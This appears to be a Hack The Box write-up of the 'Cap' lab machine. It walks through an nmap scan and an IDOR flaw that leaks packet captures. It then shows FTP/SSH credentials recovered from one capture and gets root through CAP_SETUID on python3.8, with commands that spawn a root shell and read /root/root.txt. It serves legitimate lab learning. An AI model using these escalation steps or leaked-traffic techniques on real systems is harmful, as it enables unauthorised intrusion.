Cap was a pretty fun and very easy box, for someone who's a complete beginner it's a good box to dip their toes in learning about packet tracing and linux capabilities.

We start of with a standard nmap port scan:
```
$ sudo nmap -sC -sV -O -p- cap.htb
```
The open ports revealed are:
- 21 - FTP
- 22 - SSH
- 80 - HTML

We will try poking at the FTP server to see if we have anonymous login
```bash
ftp cap.htb # we will enter 'anonymous' as our credentials
```
Looks not, so we will move to the webapp.
http://cap.htb/

Seems to be a network security dashboard of some sort, let's move onto the "Security Snapshot" section.
We notice we can download .pcap (packet capture) files that monitor network traffic.
The curious part is the number in the URL (http://cap.htb/data/2), it seems to be an ID of some sort.

## Insecure Direct Object Reference (IDOR) Vulnerability
https://portswigger.net/web-security/access-control/idor

Let's see if we can mess with it and enter 0 as the ID in the URL:
http://cap.htb/data/0
We can clearly notice that this is someone else's network traffic and not our own.
If we inspect the .pcap file in wireshark, we can find credentials used to connect to the FTP server:

nathan:Buck3tH4TF0RM3!

# User Flag
We also notice that we can use these same credentials to get an SSH connection to the box.
```bash
$ ssh nathan@cap.htb
> Buck3tH4TF0RM3!
nathan@cap:~$
nathan@cap:~$ cat user.txt
```

# Privilege Escalation and Root Flag
Let's pretend we didn't realise the hint from the box name and let's run LinPEAS.
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

The Privilege escalation is very simple, but hard to notice and understand at first.
Out of all the LinPEAS output, the thing that is supposed to catch our eyes is the following:
```bash
Files with capabilities:
/usr/bin/python3.8 = ***cap_setuid***, cap_net_bind_service+eip
```
Let's break this down...

Setuid stands for Set UID (User ID) on execution and it is one of the things used to determine the privileges when running a process in linux.

Linux differentiates two kinds of processes in terms of privilege:
- Privileged processes: Processes whose effective UID is 0 (root)
- Unprivileged processes: Processes whose effective UID is not zero (non-privileged user)

All of the privileges associated with root are split into smaller units known as capabilities.
Notice the hint from the box name now?
Essentially, capabilities are small puzzle pieces of privilege that we can use to give a certain process (in this case python) a small part of root's authority for the sake of performing specific tasks with sufficient privilege.
The SETUID Capability allows a process to make arbitrary manipulations of process UIDs, among some other things.
The fact that the python binary has CAP_SETUID means that we can use the python interpreter to escalate to root.

Here's how:
```bash
nathan@cap:~$ /usr/bin/python3.8
python3 > import os
python3 > os.setuid(0)
```
After doing this, our python process has the effective User ID 0, meaning we have root privileges **inside of this python interpreter**.
We bypassed any kernel permission checking because the python binary has the CAP_SETUID.
Keep in mind, the user nathan himself doesn't have root privileges, only the python process running does.
```bash
python3 > os.system("/bin/bash")
```
Since our python interpreter is privileged, the /bin/bash command will be ran as root, and we will drop into a privileged root shell.



The quick one-line way for the flag would be 
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/cat /root/root.txt")'
```

That's it for Cap!
Props to InfoSecJack for the box!
# 
Read more about Linux Capabilities here:

https://man7.org/linux/man-pages/man7/capabilities.7.html

https://linux.die.net/man/7/capabilities

https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities







